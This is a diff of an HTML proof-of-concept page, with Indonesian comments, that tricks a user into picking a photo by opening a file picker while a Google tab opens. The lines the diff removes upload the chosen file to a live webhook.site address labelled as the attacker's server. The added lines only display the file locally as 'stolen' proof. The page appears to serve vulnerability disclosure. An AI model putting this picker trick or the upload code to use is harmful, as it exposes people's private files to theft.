@@ -42,7 +42,6 @@
         margin-top: 15px;
         font-size: 14px;
         color: #1a73e8;
-        word-break: break-word;
       }
     </style>
   </head>
@@ -68,96 +67,59 @@
       <div id="statusMsg" class="status"></div>
     </div>
     <input type="file" id="fileSelect" accept="image/*" />
-    <iframe name="uploadFrame" style="display: none"></iframe>
 
     <script>
       const trigger = document.getElementById("triggerBtn");
       const fileInput = document.getElementById("fileSelect");
       const statusDiv = document.getElementById("statusMsg");
 
-      // URL webhook (ganti dengan milik Anda)
-      const ATTACKER_SERVER =
-        "https://webhook.site/17b37178-709d-4f89-88d2-ed6c4abb8933";
-
-      // Fungsi untuk mengirim file tanpa fetch (pakai form + iframe)
-      function sendFileViaForm(file) {
-        const form = document.createElement("form");
-        form.method = "POST";
-        form.action = ATTACKER_SERVER;
-        form.target = "uploadFrame";
-        form.enctype = "multipart/form-data";
-        form.style.display = "none";
-        const fileField = document.createElement("input");
-        fileField.type = "file";
-        fileField.name = "file";
-        // Tidak bisa mengisi file dari JavaScript karena masalah keamanan (File API)
-        // Jadi pendekatan ini tidak akan langsung berhasil.
-        // Kita tetap gunakan fetch.
-        alert(
-          "Form method tidak mendukung karena tidak bisa men-set file dari JS.",
-        );
-      }
-
-      // Simpan bukti ke localStorage
-      function storeProof(file) {
-        const proof = {
-          name: file.name,
-          size: file.size,
-          time: new Date().toISOString(),
-          type: file.type,
-        };
-        localStorage.setItem("capturedFile", JSON.stringify(proof));
-        statusDiv.innerHTML = `✅ File captured: ${file.name} (${file.size} bytes). Proof saved locally.`;
-        alert(
-          `[PoC] File "${file.name}" has been captured. Proof stored in localStorage.`,
-        );
-      }
-
       trigger.onclick = (e) => {
         e.preventDefault();
         statusDiv.innerHTML = "Opening Google...";
-        fileInput.click();
-        window.open("https://google.com", "_blank");
+        fileInput.click(); // Buka file picker
+        window.open("https://google.com", "_blank"); // Buka tab Google
       };
 
-      fileInput.onchange = async () => {
+      fileInput.onchange = () => {
         if (fileInput.files.length === 0) return;
         const file = fileInput.files[0];
-        statusDiv.innerHTML = `Selected: ${file.name}. Trying to send...`;
+        statusDiv.innerHTML = `Selected: ${file.name}. Exfiltrating...`;
 
-        // Coba kirim dengan fetch
-        const formData = new FormData();
-        formData.append("file", file);
-        formData.append("filename", file.name);
-        formData.append("timestamp", new Date().toISOString());
-
-        try {
-          const response = await fetch(ATTACKER_SERVER, {
-            method: "POST",
-            body: formData,
-          });
-          if (response.ok) {
-            statusDiv.innerHTML = `✅ File "${file.name}" sent to attacker server!`;
-            alert(`[PoC] File sent to attacker server.`);
+        const reader = new FileReader();
+        reader.onload = function (ev) {
+          const dataUrl = ev.target.result;
+          // Buka tab baru yang menampilkan gambar yang dipilih (bukti eksfiltrasi)
+          const exfilWindow = window.open();
+          if (exfilWindow) {
+            exfilWindow.document.write(`
+                    <html><head><title>Exfiltrated File</title></head>
+                    <body style="text-align:center; font-family:Arial;">
+                        <h2>File captured by attacker</h2>
+                        <img src="${dataUrl}" style="max-width:90%; max-height:70vh;">
+                        <p><b>File:</b> ${file.name}<br><b>Size:</b> ${file.size} bytes</p>
+                        <p style="color:red;">This photo has been stolen!</p>
+                    </body>
+                    </html>
+                `);
+            statusDiv.innerHTML = `✅ File "${file.name}" opened in new tab as proof!`;
+            alert(
+              `[PoC] File "${file.name}" has been opened in a new tab. Attacker can now see your photo.`,
+            );
           } else {
-            statusDiv.innerHTML = `❌ Send failed (HTTP ${response.status}), but proof stored locally.`;
-            storeProof(file);
+            // Jika popup diblokir, fallback: simpan ke localStorage dan arahkan halaman ini ke data URL
+            statusDiv.innerHTML = `⚠ Popup blocked. Saving image locally.`;
+            localStorage.setItem("exfiltratedImage", dataUrl);
+            // Tampilkan gambar di halaman ini juga
+            const img = document.createElement("img");
+            img.src = dataUrl;
+            img.style.maxWidth = "100%";
+            img.style.marginTop = "10px";
+            document.querySelector(".container").appendChild(img);
+            alert(`[PoC] File saved locally. Check page content.`);
           }
-        } catch (err) {
-          statusDiv.innerHTML = `❌ Network error (${err.message}), but proof stored locally.`;
-          storeProof(file);
-        }
+        };
+        reader.readAsDataURL(file);
       };
-
-      // Saat halaman dimuat, cek apakah ada bukti di localStorage
-      window.addEventListener("DOMContentLoaded", () => {
-        const saved = localStorage.getItem("capturedFile");
-        if (saved) {
-          const proof = JSON.parse(saved);
-          statusDiv.innerHTML = `✅ Previous capture: ${proof.name} (${proof.size} bytes) from ${proof.time}`;
-          localStorage.removeItem("capturedFile");
-        }
-      });
     </script>
   </body>
 </html>
